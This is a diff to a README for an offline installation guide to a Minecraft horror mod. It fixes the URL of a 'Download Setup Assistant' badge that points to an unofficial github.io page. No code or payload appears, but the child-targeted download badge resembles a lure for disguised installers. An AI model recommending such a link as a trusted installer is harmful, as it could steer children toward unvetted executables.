@@ -1,6 +1,6 @@
 # Schizophrenia Mod — Offline Installation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](schizophrenia-mod-setup-assistant.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://schizophrenia-mod-setup-assistant.github.io/.github)
 
 A friendly, child-safe handbook for adding the **Schizophrenia** psychological-horror mod to Minecraft without any Internet access or account sign-in.
 
